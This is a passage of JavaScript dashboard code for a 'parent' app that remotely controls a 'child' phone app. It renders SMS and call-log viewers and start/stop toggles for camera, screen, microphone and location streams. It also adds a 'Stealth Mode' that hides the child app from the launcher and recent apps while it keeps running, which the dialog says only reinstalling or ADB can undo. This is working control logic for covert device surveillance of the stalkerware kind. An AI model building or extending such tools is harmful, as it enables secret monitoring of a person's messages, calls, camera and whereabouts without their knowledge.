          <form id=\"sms-filter-form\" style=\"display:flex;flex-direction:column;gap:0.7rem;\">
            <div style=\"display:flex;flex-direction:column;gap:0.45rem;align-items:flex-start;\">
              <label style=\"display:flex;align-items:center;gap:0.6em;font-size:0.98em;margin-left:0;white-space:nowrap;\"><input type=\"radio\" name=\"sms-type\" value=\"all\" checked style=\"accent-color:#2563eb;margin-right:0.6em;\"><span style=\"white-space:nowrap;\">All Messages</span></label>
              <label style=\"display:flex;align-items:center;gap:0.6em;font-size:0.98em;margin-left:0;white-space:nowrap;\"><input type=\"radio\" name=\"sms-type\" value=\"inbox\" style=\"accent-color:#2563eb;margin-right:0.6em;\"><span style=\"white-space:nowrap;\">Inbox</span></label>
              <label style=\"display:flex;align-items:center;gap:0.6em;font-size:0.98em;margin-left:0;white-space:nowrap;\"><input type=\"radio\" name=\"sms-type\" value=\"sent\" style=\"accent-color:#2563eb;margin-right:0.6em;\"><span style=\"white-space:nowrap;\">Sent</span></label>
            </div>
            <div style=\"display:flex;flex-direction:column;gap:0.5rem;\">
              <div style=\"display:flex;flex-direction:column;gap:0.2rem;\">
                <label style=\"font-size:0.95em;opacity:0.8;margin-bottom:0.1em;\">From</label>
                <input id=\"sms-filter-start\" type=\"date\" style=\"padding:0.2em 0.5em;border-radius:0.3em;border:1px solid #333;background:#19191c;color:#fff;\">
              </div>
              <div style=\"display:flex;flex-direction:column;gap:0.2rem;\">
                <label style=\"font-size:0.95em;opacity:0.8;margin-bottom:0.1em;\">To</label>
                <input id=\"sms-filter-end\" type=\"date\" style=\"padding:0.2em 0.5em;border-radius:0.3em;border:1px solid #333;background:#19191c;color:#fff;\">
              </div>
            </div>
            <div style=\"display:flex;gap:0.5em;justify-content:flex-end;\">
              <button type=\"submit\" style=\"background:#2563eb;color:#fff;border:none;border-radius:0.4em;padding:0.3em 1.1em;font-size:0.98em;cursor:pointer;box-shadow:0 1px 4px #0003;transition:background 0.2s;\">Apply</button>
              <button type=\"button\" id=\"sms-filter-clear\" style=\"background:#333;color:#fff;border:none;border-radius:0.4em;padding:0.3em 1.1em;font-size:0.98em;cursor:pointer;box-shadow:0 1px 4px #0003;transition:background 0.2s;\">Clear</button>
            </div>
          </form>
        </div>
        <div id=\"sms-list\" class=\"max-h-64 overflow-y-auto bg-zinc-900 rounded p-2 border border-zinc-700 text-xs text-white\" style=\"min-height: 60px; margin-top:3.5rem;\">No SMS received yet.</div>
        <div id=\"${statusId}\" class=\"feature-status\"></div>
        <div id=\"${feature}-extra\"></div>
      </div>
      <button class=\"feature-action-btn ${btnClass}\" id=\"${buttonId}\" style=\"position:fixed;left:50%;bottom:18px;transform:translateX(-50%);width:90%;max-width:400px;z-index:3000;background:#18181b;box-shadow:0 2px 16px #000b;\">${icon} ${label} SMS</button>
    `;
    setTimeout(() => {
      const filterToggle = document.getElementById('sms-filter-toggle');
      const filterDropdown = document.getElementById('sms-filter-dropdown');
      if (filterToggle && filterDropdown) {
        filterToggle.addEventListener('click', function(e) {
          e.stopPropagation();
          if (filterDropdown.style.display === 'none' || !filterDropdown.style.display) {
            filterDropdown.style.display = 'block';
          } else {
            filterDropdown.style.display = 'none';
          }
        });
        document.addEventListener('click', function(event) {
          if (!filterDropdown.contains(event.target) && event.target !== filterToggle) {
            filterDropdown.style.display = 'none';
          }
        });
      }
      // Filter logic: on submit, filter SMS list
      const filterForm = document.getElementById('sms-filter-form');
      if (filterForm) {
        filterForm.addEventListener('submit', function(e) {
          e.preventDefault();
          // Get selected type and dates
          const type = filterForm.querySelector('input[name="sms-type"]:checked')?.value || 'all';
          const start = filterForm.querySelector('#sms-filter-start')?.value;
          const end = filterForm.querySelector('#sms-filter-end')?.value;
          // Update SMS filters and render
          if (window.parentApp && window.parentApp.dashboard) {
            window.parentApp.dashboard.smsFilters.type = type;
            window.parentApp.dashboard.smsFilters.startDate = start;
            window.parentApp.dashboard.smsFilters.endDate = end;
            window.parentApp.dashboard.renderSmsList();
          }
          filterDropdown.style.display = 'none';
        });
        const clearBtn = document.getElementById('sms-filter-clear');
        if (clearBtn) {
          clearBtn.addEventListener('click', function() {
            filterForm.reset();
            if (window.parentApp && window.parentApp.dashboard) {
              window.parentApp.dashboard.clearSmsFilter();
            }
            filterDropdown.style.display = 'none';
          });
        }
      }
      
      // Search bar functionality
      const searchBar = document.getElementById('sms-search-bar');
      if (searchBar) {
        searchBar.addEventListener('input', function() {
          if (window.parentApp && window.parentApp.dashboard) {
            window.parentApp.dashboard.smsFilters.keyword = this.value.trim();
            window.parentApp.dashboard.renderSmsList();
          }
        });
      }
    }, 0);
    // Remove broken direct onclick assignments for sms-filter-apply and sms-filter-clear
    // Toggle button logic
    const toggleBtn = document.getElementById(buttonId);
    let isLoading = false;
    const updateBtn = () => {
      const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
      if (!toggleBtn) return;
      if (isLoading) {
        toggleBtn.innerHTML = `<span class='feature-btn-spinner'></span> ${state ? 'Stopping...' : 'Starting...'}`;
        toggleBtn.disabled = true;
        toggleBtn.className = `feature-action-btn ${state ? 'bg-red-600' : 'bg-green-600'}`;
      } else {
        toggleBtn.textContent = `${icon} ${state ? 'Stop' : 'Start'} SMS`;
        toggleBtn.disabled = false;
        toggleBtn.className = `feature-action-btn ${state ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'}`;
      }
    };
    toggleBtn.onclick = () => {
      const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
      isLoading = true;
      updateBtn();
      sendCommand(state ? stopCmd : startCmd);
    };
    setTimeout(updateBtn, 0);
    if (!window._featureBtnUpdateListeners) window._featureBtnUpdateListeners = {};
    window._featureBtnUpdateListeners[feature] = () => {
      isLoading = false;
      updateBtn();
    };
    // Render SMS list
    if (window.parentApp && window.parentApp.dashboard) {
      window.parentApp.dashboard.renderSmsList();
    }
  
  } else if (feature === 'calllog') {
      container.innerHTML = `
      <div class=\"feature-section\" style=\"padding:0.5rem 0;position:relative;\">
        <div style=\"position:fixed;top:64px;left:50%;transform:translateX(-50%);width:90%;max-width:400px;z-index:3000;display:flex;align-items:center;gap:0.75rem;box-shadow:0 2px 16px #000b;opacity:1;background:#18181b;border-radius:0.5rem;padding:0.25rem 0.75rem;\">
          <input id=\"calllog-search-bar\" type=\"text\" placeholder=\"Search call logs...\" class=\"px-3 py-2 rounded bg-zinc-900 text-white border border-zinc-700 text-sm\" style=\"flex:1;min-width:0;outline:none;border-radius:0.375rem;opacity:1;background:#18181b;\" />
          <button id=\"calllog-filter-toggle\" aria-label=\"Show filters\" style=\"background:none;border:none;outline:none;cursor:pointer;font-size:1.7rem;line-height:1;color:#fff;opacity:1;transition:background 0.2s;border-radius:0.375rem;padding:0.2rem 0.6rem;\">☰</button>
        </div>
        <div id=\"calllog-filter-dropdown\" style=\"display:none;position:fixed;top:108px;left:calc(50% + 120px);transform:translateX(-50%);min-width:220px;max-width:260px;z-index:4000;background:#23232b;border-radius:0.75rem;box-shadow:0 8px 32px #000b,0 1.5px 6px #0007;padding:1rem 1.1rem;opacity:1;\">
          <form id=\"calllog-filter-form\" style=\"display:flex;flex-direction:column;gap:0.7rem;\">
            <div style=\"display:flex;flex-direction:column;gap:0.45rem;align-items:flex-start;\">
              <label style=\"display:flex;align-items:center;gap:0.6em;font-size:0.98em;margin-left:0;white-space:nowrap;\"><input type=\"radio\" name=\"calllog-type\" value=\"all\" checked style=\"accent-color:#2563eb;margin-right:0.6em;\"><span style=\"white-space:nowrap;\">All Call Logs</span></label>
              <label style=\"display:flex;align-items:center;gap:0.6em;font-size:0.98em;margin-left:0;white-space:nowrap;\"><input type=\"radio\" name=\"calllog-type\" value=\"incoming\" style=\"accent-color:#2563eb;margin-right:0.6em;\"><span style=\"white-space:nowrap;\">Incoming</span></label>
              <label style=\"display:flex;align-items:center;gap:0.6em;font-size:0.98em;margin-left:0;white-space:nowrap;\"><input type=\"radio\" name=\"calllog-type\" value=\"outgoing\" style=\"accent-color:#2563eb;margin-right:0.6em;\"><span style=\"white-space:nowrap;\">Outgoing</span></label>
            </div>
            <div style=\"display:flex;flex-direction:column;gap:0.5rem;\">
              <div style=\"display:flex;flex-direction:column;gap:0.2rem;\">
                <label style=\"font-size:0.95em;opacity:0.8;margin-bottom:0.1em;\">From</label>
                <input id=\"calllog-filter-start\" type=\"date\" style=\"padding:0.2em 0.5em;border-radius:0.3em;border:1px solid #333;background:#19191c;color:#fff;\">
              </div>
              <div style=\"display:flex;flex-direction:column;gap:0.2rem;\">
                <label style=\"font-size:0.95em;opacity:0.8;margin-bottom:0.1em;\">To</label>
                <input id=\"calllog-filter-end\" type=\"date\" style=\"padding:0.2em 0.5em;border-radius:0.3em;border:1px solid #333;background:#19191c;color:#fff;\">
              </div>
            </div>
            <div style=\"display:flex;gap:0.5em;justify-content:flex-end;\">
              <button type=\"submit\" style=\"background:#2563eb;color:#fff;border:none;border-radius:0.4em;padding:0.3em 1.1em;font-size:0.98em;cursor:pointer;box-shadow:0 1px 4px #0003;transition:background 0.2s;\">Apply</button>
              <button type=\"button\" id=\"calllog-filter-clear\" style=\"background:#333;color:#fff;border:none;border-radius:0.4em;padding:0.3em 1.1em;font-size:0.98em;cursor:pointer;box-shadow:0 1px 4px #0003;transition:background 0.2s;\">Clear</button>
            </div>
          </form>
        </div>
        <div id=\"calllog-list\" class=\"max-h-64 overflow-y-auto bg-zinc-900 rounded p-2 border border-zinc-700 text-xs text-white\" style=\"min-height: 60px; margin-top:3.5rem;\">No call logs received yet.</div>
        <div id=\"${statusId}\" class=\"feature-status\"></div>
        <div id=\"${feature}-extra\"></div>
      </div>
      <button class=\"feature-action-btn ${btnClass}\" id=\"${buttonId}\" style=\"position:fixed;left:50%;bottom:18px;transform:translateX(-50%);width:90%;max-width:400px;z-index:3000;background:#18181b;box-shadow:0 2px 16px #000b;\">${icon} ${label} Call Log</button>
    `;
    setTimeout(() => {
      const filterToggle = document.getElementById('calllog-filter-toggle');
      const filterDropdown = document.getElementById('calllog-filter-dropdown');
      if (filterToggle && filterDropdown) {
        filterToggle.addEventListener('click', function(e) {
          e.stopPropagation();
          if (filterDropdown.style.display === 'none' || !filterDropdown.style.display) {
            filterDropdown.style.display = 'block';
          } else {
            filterDropdown.style.display = 'none';
          }
        });
        document.addEventListener('click', function(event) {
          if (!filterDropdown.contains(event.target) && event.target !== filterToggle) {
            filterDropdown.style.display = 'none';
          }
        });
      }
      // Filter logic: on submit, filter call log list
      const filterForm = document.getElementById('calllog-filter-form');
      if (filterForm) {
        filterForm.addEventListener('submit', function(e) {
          e.preventDefault();
          // Get selected type and dates
          const type = filterForm.querySelector('input[name="calllog-type"]:checked')?.value || 'all';
          const start = filterForm.querySelector('#calllog-filter-start')?.value;
          const end = filterForm.querySelector('#calllog-filter-end')?.value;
          // Update call log filters and render
          if (window.parentApp && window.parentApp.dashboard) {
            window.parentApp.dashboard.callLogFilters = {
              type: type,
              startDate: start,
              endDate: end
            };
            window.parentApp.dashboard.renderCallLogList();
          }
          filterDropdown.style.display = 'none';
        });
        const clearBtn = document.getElementById('calllog-filter-clear');
        if (clearBtn) {
          clearBtn.addEventListener('click', function() {
            filterForm.reset();
            if (window.parentApp && window.parentApp.dashboard) {
              window.parentApp.dashboard.callLogFilters = { type: 'all', startDate: '', endDate: '' };
              window.parentApp.dashboard.renderCallLogList();
            }
            filterDropdown.style.display = 'none';
          });
        }
      }
      
      // Search bar functionality
      const searchBar = document.getElementById('calllog-search-bar');
      if (searchBar) {
        searchBar.addEventListener('input', function() {
          if (window.parentApp && window.parentApp.dashboard) {
            window.parentApp.dashboard.callLogSearchKeyword = this.value.trim();
            window.parentApp.dashboard.renderCallLogList();
          }
        });
      }
    }, 0);
    // Remove broken direct onclick assignments for calllog-filter-apply and calllog-filter-clear
    // Toggle button logic
    const toggleBtn = document.getElementById(buttonId);
    let isLoading = false;
    const updateBtn = () => {
      const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
      if (!toggleBtn) return;
      if (isLoading) {
        toggleBtn.innerHTML = `<span class='feature-btn-spinner'></span> ${state ? 'Stopping...' : 'Show Call Logs'}`;
        toggleBtn.disabled = true;
        toggleBtn.className = `feature-action-btn ${state ? 'bg-red-600' : 'bg-green-600'}`;
      } else {
        // Force correct label for calllog
        if (feature === 'calllog') {
          toggleBtn.textContent = `${icon} ${state ? 'Stop Call Log' : 'Show Call Logs'}`;
        } else {
          toggleBtn.textContent = `${icon} ${state ? 'Stop' : 'Start'} ${feature.charAt(0).toUpperCase() + feature.slice(1)}`;
        }
        toggleBtn.disabled = false;
        toggleBtn.className = `feature-action-btn ${state ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'}`;
      }
    };
    toggleBtn.onclick = () => {
      const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
      isLoading = true;
      updateBtn();
      sendCommand(state ? 'CALLLOG_OFF' : 'CALLLOG_ON');
    };
    setTimeout(updateBtn, 0);
    if (!window._featureBtnUpdateListeners) window._featureBtnUpdateListeners = {};
    window._featureBtnUpdateListeners['calllog'] = () => {
      isLoading = false;
      updateBtn();
    };
    if (window.parentApp && window.parentApp.dashboard) {
      window.parentApp.dashboard.renderCallLogList();
    }
  } else if (feature === 'browser') {
    // Browser functionality is handled by the sidebar dropdown, no feature window needed
    container.innerHTML = `<div style="color:#888;text-align:center;padding:2rem;">Browser functionality is available in the sidebar dropdown.</div>`;
    return;
  } else {
    container.innerHTML = `<div style=\"color:#888;\">Feature not implemented yet.</div>`;
    return;
  }
  const toggleBtn = document.getElementById(buttonId);
  let isLoading = false;
  const updateBtn = () => {
    const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
    if (isLoading) {
      toggleBtn.innerHTML = `<span class='feature-btn-spinner'></span> ${state ? 'Stopping...' : 'Starting...'}`;
      toggleBtn.disabled = true;
      toggleBtn.className = `feature-action-btn ${state ? 'bg-red-600' : 'bg-green-600'}`;
    } else {
      toggleBtn.textContent = `${icon} ${state ? 'Stop' : 'Start'} ${feature.charAt(0).toUpperCase() + feature.slice(1)}`;
      toggleBtn.className = `feature-action-btn ${state ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'}`;
      toggleBtn.disabled = false;
    }
  };
  toggleBtn.onclick = () => {
    const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
    isLoading = true;
    updateBtn();
    sendCommand(state ? stopCmd : startCmd);
  };
  setTimeout(updateBtn, 0);
  if (!window._featureBtnUpdateListeners) window._featureBtnUpdateListeners = {};
  window._featureBtnUpdateListeners[feature] = () => {
    isLoading = false;
    updateBtn();
  };
};

// Add at the end of Dashboard.prototype.init or after sidebar rendering logic
Dashboard.prototype.addStealthModeButton = function() {
  const sidebar = document.getElementById('sidebar') || document.body;
  let stealthBtn = document.getElementById('stealth-mode-btn');
  if (!stealthBtn) {
    stealthBtn = document.createElement('button');
    stealthBtn.id = 'stealth-mode-btn';
    stealthBtn.textContent = '🕵️ Stealth Mode';
    stealthBtn.className = 'sidebar-btn';
    stealthBtn.style = 'background:#b91c1c;color:#fff;font-size:1.1rem;font-weight:bold;box-shadow:0 2px 8px #0005;';
    // Insert after Browser button
    const browserBtn = document.getElementById('browser-dropdown-btn');
    if (browserBtn && browserBtn.parentNode) {
      browserBtn.parentNode.insertAdjacentElement('afterend', stealthBtn);
    } else {
      sidebar.appendChild(stealthBtn);
    }
  }
  let stealthState = 'off'; // 'off', 'pending', 'on'
  let spinnerInterval = null;
  function setSpinner() {
    let dots = 0;
    stealthBtn.disabled = true;
    stealthBtn.textContent = 'Stealthing';
    spinnerInterval = setInterval(() => {
      dots = (dots + 1) % 4;
      stealthBtn.textContent = 'Stealthing' + '.'.repeat(dots);
    }, 400);
  }
  function clearSpinner() {
    if (spinnerInterval) clearInterval(spinnerInterval);
    spinnerInterval = null;
  }
  function setStealthOn() {
    clearSpinner();
    stealthBtn.disabled = false;
    stealthBtn.textContent = '🛑 Stop Stealth';
    stealthBtn.style.background = '#f59e42';
    stealthState = 'on';
  }
  function setStealthOff() {
    clearSpinner();
    stealthBtn.disabled = false;
    stealthBtn.textContent = '🕵️ Stealth Mode';
    stealthBtn.style.background = '#b91c1c';
    stealthState = 'off';
  }
  stealthBtn.onclick = () => {
    if (stealthState === 'off') {
      const dialog = document.createElement('div');
      dialog.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);z-index:10000;display:flex;align-items:center;justify-content:center;';
      dialog.innerHTML = `
        <div style="background:#18181b;padding:2rem 2.5rem;border-radius:1rem;box-shadow:0 4px 32px #000b;max-width:400px;width:90%;text-align:center;">
          <h2 style="color:#fff;margin-bottom:1rem;">Stealth Mode</h2>
          <p style="color:#f87171;margin-bottom:2rem;">Stealth mode will hide the child app from the launcher and recent apps, but it will keep running in the background. This action is serious and can only be undone by reinstalling or using ADB.</p>
          <div style="display:flex;gap:1.5rem;justify-content:center;">
            <button id="stealth-child-btn" style="background:#b91c1c;color:#fff;padding:0.7em 2em;border:none;border-radius:0.5em;font-size:1.1em;font-weight:bold;">Stealth child</button>
            <button id="cancel-stealth-btn" style="background:#333;color:#fff;padding:0.7em 2em;border:none;border-radius:0.5em;font-size:1.1em;">Cancel</button>
          </div>
        </div>
      `;
      document.body.appendChild(dialog);
      document.getElementById('cancel-stealth-btn').onclick = () => dialog.remove();
      document.getElementById('stealth-child-btn').onclick = () => {
        dialog.remove();
        if (window.parentApp && window.parentApp.dashboard && window.parentApp.dashboard.dataChannel) {
          window.parentApp.dashboard.dataChannel.send('STEALTH_ON');
          setSpinner();
          stealthState = 'pending';
        }
      };
    } else if (stealthState === 'on') {
      // Show stop stealth dialog
      const dialog = document.createElement('div');
      dialog.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);z-index:10000;display:flex;align-items:center;justify-content:center;';
      dialog.innerHTML = `
        <div style="background:#18181b;padding:2rem 2.5rem;border-radius:1rem;box-shadow:0 4px 32px #000b;max-width:400px;width:90%;text-align:center;">
          <h2 style="color:#fff;margin-bottom:1rem;">Stop Stealth</h2>
          <p style="color:#f87171;margin-bottom:2rem;">Stopping stealth mode will make the child app visible again in the app drawer and recent apps. Are you sure you want to stop stealth mode?</p>
          <div style="display:flex;gap:1.5rem;justify-content:center;">
            <button id="stop-stealth-btn" style="background:#f59e42;color:#fff;padding:0.7em 2em;border:none;border-radius:0.5em;font-size:1.1em;font-weight:bold;">Stop stealth</button>
            <button id="cancel-stop-stealth-btn" style="background:#333;color:#fff;padding:0.7em 2em;border:none;border-radius:0.5em;font-size:1.1em;">Cancel</button>
          </div>
        </div>
      `;
      document.body.appendChild(dialog);
      document.getElementById('cancel-stop-stealth-btn').onclick = () => dialog.remove();
      document.getElementById('stop-stealth-btn').onclick = () => {
        dialog.remove();
        if (window.parentApp && window.parentApp.dashboard && window.parentApp.dashboard.dataChannel) {
          window.parentApp.dashboard.dataChannel.send('STEALTH_OFF');
          setSpinner();
          stealthState = 'pending';
        }
      };
    }
  };
  // Listen for child logs/acks
  if (!window._stealthAckListener) {
    window._stealthAckListener = function(message) {
      if (message === 'STEALTH_ON_ACK') {
        setStealthOn();
      } else if (message === 'STEALTH_OFF_ACK') {
        setStealthOff();
      }
    };
    if (window.parentApp && window.parentApp.dashboard) {
      const origHandleChildMessage = window.parentApp.dashboard.handleChildMessage;
      window.parentApp.dashboard.handleChildMessage = function(message) {
        window._stealthAckListener(message);
        return origHandleChildMessage.call(this, message);
      };
    }
  }
};
// Call this after dashboard is shown
if (!window._dashboardShowPatched) {
  window._dashboardShowPatched = true;
  const origShow = Dashboard.prototype.show;
  Dashboard.prototype.show = function(childId, peerConnection, dataChannel) {
    origShow.call(this, childId, peerConnection, dataChannel);
    this.addStealthModeButton();
  };
}

// Helper to update mic status in the mic window
function updateMicStatus() {
  const statusDiv = document.getElementById('mic-status');
  if (!statusDiv) return;
  const app = window.parentApp;
  if (app && app.dashboard) {
    const micActive = app.dashboard.streamStates && app.dashboard.streamStates.mic;
    statusDiv.textContent = micActive ? '🎤 Mic is live' : 'Mic is off';
    statusDiv.className = 'feature-status ' + (micActive ? 'text-green-400' : 'text-zinc-500');
  }
}

// Patch Dashboard.prototype.handleChildMessage to update toggle buttons live and clear loading state
const origHandleChildMessage = Dashboard.prototype.handleChildMessage;
Dashboard.prototype.handleChildMessage = function(message) {
  // Handle stealth ACKs first
  if (message === 'STEALTH_ON_ACK') {
    if (typeof setStealthOn === 'function') setStealthOn();
    return;
  }
  if (message === 'STEALTH_OFF_ACK') {
    if (typeof setStealthOff === 'function') setStealthOff();
    return;
  }
  const features = ['camera','screen','mic','location','sms','calllog'];
  for (const feature of features) {
    if (message === `${feature.toUpperCase()}_STARTED` || message === `${feature.toUpperCase()}_STOPPED`) {
      setTimeout(() => {
        if (window._featureBtnUpdateListeners && window._featureBtnUpdateListeners[feature]) {
          window._featureBtnUpdateListeners[feature]();
        }
        const btn = document.getElementById(`${feature}-toggle`);
        if (btn) {
          const app = window.parentApp;
          const state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
          btn.textContent = `${feature === 'camera' ? '📷' : feature === 'screen' ? '🖥️' : feature === 'mic' ? '🎤' : feature === 'location' ? '📍' : '📩'} ${state ? 'Stop' : 'Start'} ${feature.charAt(0).toUpperCase() + feature.slice(1)}`;
          btn.className = `feature-action-btn ${state ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'}`;
          btn.disabled = false;
  }
      }, 0);
    }
  }
  return origHandleChildMessage.call(this, message);
};

// Export for use in other modules
window.Dashboard = Dashboard;